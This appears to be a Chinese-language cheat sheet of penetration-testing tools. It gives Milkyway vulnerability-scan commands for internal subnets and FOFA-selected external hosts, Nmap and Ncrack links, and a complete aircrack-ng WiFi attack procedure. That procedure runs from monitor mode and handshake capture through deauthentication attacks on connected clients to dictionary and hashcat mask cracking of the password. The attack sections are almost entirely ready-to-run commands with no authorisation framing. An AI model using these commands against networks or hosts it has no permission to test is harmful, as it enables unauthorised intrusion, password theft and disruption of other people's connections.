...
> 资料
* [90天学会网络安全](https://github.com/farhanashrafdev/90DaysOfCyberSecurity)
...
~~~
* [`端口`扫描](https://github.com/topics/port-scanner)[工具`naabu`](https://github.com/projectdiscovery/naabu)、[内网`漏洞`扫描`fscan`](https://github.com/shadow1ng/fscan)、[`漏洞`扫描`Milkyway`](https://github.com/polite-007/Milkyway)、[`漏洞`集成`docker`平台](https://vulfocus.cn/)[`Vulfocus`](https://github.com/fofapro/vulfocus)
~~~bash
arp -a  # arp-scan -I eth0 --localhost   # 局域网内所有IP
...
milkyway --fofa-query "domain=vulfocus.cn||host=vulfocus.cn" -p all --no-ping --scan-random # 外网●全端口●乱序扫描
milkyway -t 192.168.2.12/24 -p all -c 1000 --no-ping --scan-random # 内网●全端口●无序扫描
milkyway -t 192.168.1.12/24 -p small --full-scan # ●使用常用12个端口●全协议识别
milkyway -t 192.168.1.12/24 -p sql     # ●使用常用数据库端口
milkyway -t 192.168.1.12/24 -p company # ●使用公司常用87个端口
milkyway -t 192.168.1.12/24 --no-ping  # ●跳过协议icmp扫描
milkyway -t 192.168.1.12/24 --no-match # ●漏洞扫描不进行指纹匹配(即下发全量)
milkyway -t 192.168.1.12/24 --poc-tags cve,cnvd # ●指定多个漏洞poc标签
milkyway -t 192.168.1.12/24 --poc-file ./your/poc # ●自定义漏洞poc目录
milkyway -t 192.168.1.12/24 --finger-file ./your.file # ●自定义指纹文件
milkyway -t 192.168.1.12/24 --verbose  # ●打印协议详细信息

~~~
* [`端口`扫描`Nmap`](https://github.com/nmap)、[`Npcap`](https://github.com/nmap/npcap)、[`网络认证`破解`Ncrack`](https://github.com/nmap/ncrack)
~~~
...
cvs 2401/tcp
~~~
* [`WiFi网络渗透`密码破解](https://www.cnblogs.com/xiao1234oaix/p/17287409.html)[`Aircrack-ng`](https://www.aircrack-ng.org)
~~~bash
sudo -i   # 用管理员权限
ifconfig  # 查看当前网卡 Interface = wlan0 
iwconfig  # 查看当前模式 Mode:Monitor = wlan0mon 
airmon-ng              # 检查网卡是否支持监听
airmon-ng check kill   # 建议先关闭可能会影响的进程
airmon-ng start wlan0  # 激活无线网卡监听模式 NetworkManager + wpa_supplicant
airodump-ng wlan0mon   # 扫描附近WiFi +停止命令Ctrl+C -距离PWR值越大越近

# 被动等待抓包命令 # 保持抓包窗口一直开着 + 停止命令Ctrl+C
airodump-ng --bssid *:*:*:*:*:* --channel 9 --write ./handshake wlan0mon
   # airodump参数: --bssid “MAC地址”  --channel -c “CH频段信道” --write -w “保存文件名”
   # airodump输出: “bssid无线网卡MAC地址” + “STATION客户端”

# 主动ACK循环攻击 # 等待抓包窗口出现[成功]握手包~ WPA handshake: *:*:*:* 然后停止抓包
aireplay-ng -a *:*:*:*:*:* -c *:* -0 90 wlan0mon
   # aireplay参数: -a “bssid地址” -c “下线STATION客户端” -0 “通知设备断开攻击次数(一般60~90之间)”
   # aireplay参数 不指定 -c 目标MAC地址, 就是对AP下面所有终端进行攻击

# 破解密码
aircrack-ng -b *:*:*:*:*:* -w password.txt *.cap
   # aircracky参数: -b “bssid地址” -w “密码字典文件”  “抓包成功的cap文件”
# 把cap转成hashcat文件 https://hashcat.net/cap2hashcat
hcxpcapngtool handshake-01.cap -o handshake-01.hc22000
# 用hashcat破解密码  参数: -m 22000 模式 = WPA-PBKDF2-PMKID+EAPOL
hashcat --show --status -m 22000 handshake-01.hc22000 password.txt
   # 参数: -a 3 “掩码破解方式” --increment- “密码长度限制”  ?h小写字母加数字 ?|小写 ?u大写 ?d数字 ?s特殊 ?a全部
hashcat -a 3 -m 22000 --increment --increment-min 8 --increment-max 8 hs-01.hc22000 ?h?h?h?h?h?h?h?h
